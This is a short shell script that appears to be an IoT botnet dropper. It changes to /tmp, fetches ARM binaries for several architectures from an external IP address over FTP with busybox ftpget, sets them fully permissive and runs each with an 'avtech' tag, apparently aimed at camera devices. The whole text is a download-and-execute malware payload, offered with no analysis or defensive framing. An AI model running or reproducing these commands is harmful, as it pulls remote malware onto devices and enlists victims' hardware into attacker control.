cd /tmp
rm -rf arm5; /bin/busybox ftpget 139.177.197.168 -P 8021 arm5 arm5; chmod 777 arm5; ./arm5 avtech.arm5
rm -rf arm; /bin/busybox ftpget 139.177.197.168 -P 8021 arm4 arm; chmod 777 arm4; ./arm4 avtech.arm
rm -rf arm7; /bin/busybox ftpget 139.177.197.168 -P 8021 arm7 arm7; chmod 777 arm7; ./arm7 avtech.arm7
